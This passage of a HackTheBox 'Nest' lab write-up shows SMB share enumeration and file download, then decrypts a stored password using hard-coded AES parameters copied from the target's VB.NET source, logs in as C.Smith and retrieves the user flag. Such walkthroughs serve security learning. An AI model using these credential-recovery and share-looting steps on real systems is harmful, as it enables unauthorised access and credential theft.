<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Secure$ -U TempUser</span><br><span class="line">smb: \&gt; recurse <span class="keyword">on</span></span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">12</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">12</span> <span class="number">2019</span></span><br><span class="line">  Finance                             D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">15</span>:<span class="number">40</span>:<span class="number">13</span> <span class="number">2019</span></span><br><span class="line">  HR                                  D        <span class="number">0</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">11</span> <span class="number">2019</span></span><br><span class="line">  IT                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">06</span>:<span class="number">59</span>:<span class="number">25</span> <span class="number">2019</span></span><br><span class="line">\Finance</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \Finance\*</span><br><span class="line">\HR</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \HR\*</span><br><span class="line">\IT</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \IT\*</span><br><span class="line"></span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>

<p>Interesting; it seems that the TempUser doesn‚Äôt have any access to listing the 3 directories. but ultimately I found that the IT\Carl\ folder was indeed listable:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\Secure$ -U TempUser</span><br><span class="line">Enter WORKGROUP\TempUser<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd IT/Carl</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:42:14 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:42:14 2019</span></span><br><span class="line"><span class="string">  Docs                                D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string">  VB Projects                         D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\Docs</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:44:00 2019</span></span><br><span class="line"><span class="string">  ip.txt                              A       56  Thu Aug  8 03:44:16 2019</span></span><br><span class="line"><span class="string">  mmc.txt                             A       73  Thu Aug  8 03:43:42 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\Reports</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 21:45:40 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:41:55 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string">  WIP                                 D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\Production</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:07:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 22:47:41 2019</span></span><br><span class="line"><span class="string">  RU                                  D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 23:36:45 2019</span></span><br><span class="line"><span class="string">  RUScanner                           D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  RUScanner.sln                       A      871  Tue Aug  6 22:45:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:05:54 2019</span></span><br><span class="line"><span class="string">  bin                                 D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ConfigFile.vb                       A      772  Thu Aug  8 06:05:09 2019</span></span><br><span class="line"><span class="string">  Module1.vb                          A      279  Thu Aug  8 06:05:44 2019</span></span><br><span class="line"><span class="string">  My Project                          D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  obj                                 D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  RU Scanner.vbproj                   A     4828  Fri Aug  9 23:37:51 2019</span></span><br><span class="line"><span class="string">  RU Scanner.vbproj.user              A      143  Tue Aug  6 20:55:27 2019</span></span><br><span class="line"><span class="string">  SsoIntegration.vb                   A      133  Thu Aug  8 06:05:58 2019</span></span><br><span class="line"><span class="string">  Utils.vb                            A     4888  Thu Aug  8 03:49:35 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  Debug                               D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string">  Release                             D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\My Project</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  Application.Designer.vb             A      441  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Application.myapp                   A      481  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  AssemblyInfo.vb                     A     1163  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Resources.Designer.vb               A     2776  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Resources.resx                      A     5612  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Settings.Designer.vb                A     2989  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string">  Settings.settings                   A      279  Tue Aug  6 20:55:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\obj</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 04:00:11 2019</span></span><br><span class="line"><span class="string">  x86                                 D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Debug</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:59:13 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Release</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Aug  6 20:55:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT\Carl\VB Projects\WIP\RU\RUScanner\obj\x86</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:59:18 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6544137 blocks available</span></span><br><span class="line"><span class="string">smb: \IT\Carl\&gt;</span></span><br></pre></td></tr></table></figure>

<p>Looks like there is some source code written in <code>Visual Basic</code>. SO I use <code>smbget</code> to recursively download the <code>Secure$\IT\Carl</code> directory for further analysis so :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser</span><br><span class="line">Password <span class="keyword">for</span> [TempUser] connecting to //Secure$/10.10.10.178: </span><br><span class="line">Using workgroup WORKGROUP, user TempUser</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//Docs/ip.txt</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//Docs/mmc.txt</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/ConfigFile.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Module1.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Application.myapp</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Resources.resx</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/My Project/Settings.settings</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/SsoIntegration.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/Utils.vb</span><br><span class="line">smb://10.10.10.178/Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner.sln</span><br><span class="line">Downloaded 0b <span class="keyword">in</span> 12 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest 12s</span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>So this is the whole directory I get :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ ls</span><br><span class="line"> bin   ConfigFile.vb   Module1.vb  <span class="string">'My Project'</span>   obj  <span class="string">'RU Scanner.vbproj'</span>  <span class="string">'RU Scanner.vbproj.user'</span>   SsoIntegration.vb   Utils.vb</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Looking at the <code>.vb</code> file the <code>Module1.vb</code> was responsible for retrieving the password from <code>RU_config.xml</code> :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ cat Module1.vb </span><br><span class="line">Module Module1</span><br><span class="line"></span><br><span class="line">    Sub Main()</span><br><span class="line">        Dim Config As ConfigFile = ConfigFile.LoadFromFile(<span class="string">"RU_Config.xml"</span>)</span><br><span class="line">        Dim <span class="built_in">test</span> As New SsoIntegration With &#123;.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)&#125;</span><br><span class="line"></span><br><span class="line">    End Sub</span><br><span class="line"></span><br><span class="line">End Module</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>And the <code>Utils.vb</code> are responsible for decrypting the password :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ cat Utils.vb</span><br><span class="line">Imports System.Text</span><br><span class="line">Imports System.Security.Cryptography</span><br><span class="line">Public Class Utils</span><br><span class="line"></span><br><span class="line">    Public Shared Function GetLogFilePath() As String</span><br><span class="line">        Return IO.Path.Combine(Environment.CurrentDirectory, <span class="string">"Log.txt"</span>)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">        If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">            Return String.Empty</span><br><span class="line">        Else</span><br><span class="line">            Return Decrypt(EncryptedString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">        End If</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function EncryptString(PlainString As String) As String</span><br><span class="line">        If String.IsNullOrEmpty(PlainString) Then</span><br><span class="line">            Return String.Empty</span><br><span class="line">        Else</span><br><span class="line">            Return Encrypt(PlainString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">        End If</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function Encrypt(ByVal plainText As String, _</span><br><span class="line">                                   ByVal passPhrase As String, _</span><br><span class="line">                                   ByVal saltValue As String, _</span><br><span class="line">                                    ByVal passwordIterations As Integer, _</span><br><span class="line">                                   ByVal initVector As String, _</span><br><span class="line">                                   ByVal keySize As Integer) _</span><br><span class="line">                           As String</span><br><span class="line"></span><br><span class="line">        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)</span><br><span class="line">        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line">        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)</span><br><span class="line">        Dim password As New Rfc2898DeriveBytes(passPhrase, _</span><br><span class="line">                                           saltValueBytes, _</span><br><span class="line">                                           passwordIterations)</span><br><span class="line">        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))</span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line">        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)</span><br><span class="line">        Using memoryStream As New IO.MemoryStream()</span><br><span class="line">            Using cryptoStream As New CryptoStream(memoryStream, _</span><br><span class="line">                                            encryptor, _</span><br><span class="line">                                            CryptoStreamMode.Write)</span><br><span class="line">                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)</span><br><span class="line">                cryptoStream.FlushFinalBlock()</span><br><span class="line">                Dim cipherTextBytes As Byte() = memoryStream.ToArray()</span><br><span class="line">                memoryStream.Close()</span><br><span class="line">                cryptoStream.Close()</span><br><span class="line">                Return Convert.ToBase64String(cipherTextBytes)</span><br><span class="line">            End Using</span><br><span class="line">        End Using</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function Decrypt(ByVal cipherText As String, _</span><br><span class="line">                                   ByVal passPhrase As String, _</span><br><span class="line">                                   ByVal saltValue As String, _</span><br><span class="line">                                    ByVal passwordIterations As Integer, _</span><br><span class="line">                                   ByVal initVector As String, _</span><br><span class="line">                                   ByVal keySize As Integer) _</span><br><span class="line">                           As String</span><br><span class="line"></span><br><span class="line">        Dim initVectorBytes As Byte()</span><br><span class="line">        initVectorBytes = Encoding.ASCII.GetBytes(initVector)</span><br><span class="line"></span><br><span class="line">        Dim saltValueBytes As Byte()</span><br><span class="line">        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line"></span><br><span class="line">        Dim cipherTextBytes As Byte()</span><br><span class="line">        cipherTextBytes = Convert.FromBase64String(cipherText)</span><br><span class="line"></span><br><span class="line">        Dim password As New Rfc2898DeriveBytes(passPhrase, _</span><br><span class="line">                                           saltValueBytes, _</span><br><span class="line">                                           passwordIterations)</span><br><span class="line"></span><br><span class="line">        Dim keyBytes As Byte()</span><br><span class="line">        keyBytes = password.GetBytes(CInt(keySize / 8))</span><br><span class="line"></span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line"></span><br><span class="line">        Dim decryptor As ICryptoTransform</span><br><span class="line">        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)</span><br><span class="line"></span><br><span class="line">        Dim memoryStream As IO.MemoryStream</span><br><span class="line">        memoryStream = New IO.MemoryStream(cipherTextBytes)</span><br><span class="line"></span><br><span class="line">        Dim cryptoStream As CryptoStream</span><br><span class="line">        cryptoStream = New CryptoStream(memoryStream, _</span><br><span class="line">                                        decryptor, _</span><br><span class="line">                                        CryptoStreamMode.Read)</span><br><span class="line"></span><br><span class="line">        Dim plainTextBytes As Byte()</span><br><span class="line">        ReDim plainTextBytes(cipherTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        Dim decryptedByteCount As Integer</span><br><span class="line">        decryptedByteCount = cryptoStream.Read(plainTextBytes, _</span><br><span class="line">                                               0, _</span><br><span class="line">                                               plainTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        memoryStream.Close()</span><br><span class="line">        cryptoStream.Close()</span><br><span class="line"></span><br><span class="line">        Dim plainText As String</span><br><span class="line">        plainText = Encoding.ASCII.GetString(plainTextBytes, _</span><br><span class="line">                                            0, _</span><br><span class="line">                                            decryptedByteCount)</span><br><span class="line"></span><br><span class="line">        Return plainText</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<h3 id="Decrypting-the-Password"><a href="#Decrypting-the-Password" class="headerlink" title="Decrypting the Password"></a>Decrypting the Password</h3><p>We can cut and patch some of this code together to make a single file we can run on <a href="https://dotnetfiddle.net" target="_blank" rel="noopener">dotnetfiddle</a><br>I put the hash I got early on the line run the line <code>Return Decrypt</code> script. the decryption is happen here :</p>
<p><strong>Decrypt(‚ÄúHASH‚Äù, ‚ÄúN3st22‚Äù, ‚Äú88552299‚Äù, 2, ‚Äú464R5DFA5DL6LE28‚Äù, 256)</strong> so :</p>
<p>from :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">    If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">        Return String.Empty</span><br><span class="line">    Else</span><br><span class="line">    	<span class="comment"># replace hash here </span></span><br><span class="line">        Return Decrypt(EncryptedString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p>to :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">    If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">        Return String.Empty</span><br><span class="line">    Else</span><br><span class="line">    	<span class="comment"># replace hash here </span></span><br><span class="line">        Return Decrypt(<span class="string">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span>, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p>Execute this and we will get the password <code>xRxRxPANCAK3SxRxRx</code> this is the final results :</p>
<p><img src="/img/nest/nest-hash-result.png" alt="HackTheBox-Nest" title="Password decrypted"></p>
<hr>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Enumerate-C-Smith"><a href="#Enumerate-C-Smith" class="headerlink" title="Enumerate C.Smith"></a>Enumerate C.Smith</h3><p>So now that I successfully decrypt the password. How about try to login it again in <code>smbclient</code> :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\Users -U C.Smith</span><br><span class="line">Enter WORKGROUP\C.Smith<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 07:04:21 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 07:04:21 2020</span></span><br><span class="line"><span class="string">  Administrator                       D        0  Fri Aug  9 23:08:23 2019</span></span><br><span class="line"><span class="string">  C.Smith                             D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  L.Frost                             D        0  Fri Aug  9 01:03:01 2019</span></span><br><span class="line"><span class="string">  R.Thompson                          D        0  Fri Aug  9 01:02:50 2019</span></span><br><span class="line"><span class="string">  TempUser                            D        0  Thu Aug  8 06:55:56 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Administrator</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Administrator\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  HQK Reporting                       D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  user.txt                            A       32  Fri Aug  9 07:05:24 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\L.Frost</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \L.Frost\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\R.Thompson</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \R.Thompson\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\TempUser</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \TempUser\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith\HQK Reporting</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  AD Integration Module               D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  Debug Mode Password.txt             A        0  Fri Aug  9 07:08:17 2019</span></span><br><span class="line"><span class="string">  HQK_Config_Backup.xml               A      249  Fri Aug  9 07:09:05 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith\HQK Reporting\AD Integration Module</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  HqkLdap.exe                         A    17408  Thu Aug  8 07:41:16 2019</span></span><br></pre></td></tr></table></figure>

<p>so looks like i can now get the <code>user.txt</code> as you can see on this line :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \&gt; cd C.Smith</span><br><span class="line">smb: \C.Smith\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Sun Jan <span class="number">26</span> <span class="number">15</span>:<span class="number">21</span>:<span class="number">44</span> <span class="number">2020</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Sun Jan <span class="number">26</span> <span class="number">15</span>:<span class="number">21</span>:<span class="number">44</span> <span class="number">2020</span></span><br><span class="line">  HQK Reporting                       D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  user.txt                            A       <span class="number">32</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">05</span>:<span class="number">24</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  AD Integration Module               D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  Debug Mode Password.txt             A        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">08</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  HQK_Config_Backup.xml               A      <span class="number">249</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">09</span>:<span class="number">05</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting\AD Integration Module</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  HqkLdap.exe                         A    <span class="number">17408</span>  Thu Aug  <span class="number">8</span> <span class="number">07</span>:<span class="number">41</span>:<span class="number">16</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">                <span class="number">10485247</span> blocks of size <span class="number">4096.</span> <span class="number">6544137</span> blocks available</span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Grab-the-user-flag"><a href="#Grab-the-user-flag" class="headerlink" title="Grab the user flag"></a>Grab the user flag</h3><p>Finally I have now the <code>user.txt</code> i downloaded it using <code>smbclient</code> :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\&gt; mget user.txt</span><br><span class="line">Get file user.txt? y</span><br><span class="line">getting file \C.Smith\user.txt of size <span class="number">32</span> <span class="keyword">as</span> user.txt (<span class="number">0.0</span> KiloBytes/sec) (average <span class="number">0.0</span> KiloBytes/sec)</span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cut -c 4-12 user.txt</span><br><span class="line">b25404be</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>So going to the firs enumeration of <code>C.Smith</code> there‚Äôs a interesting <code>.txt</code> file and executable <code>HqkLdap.exe</code> as you see on this line :</p>
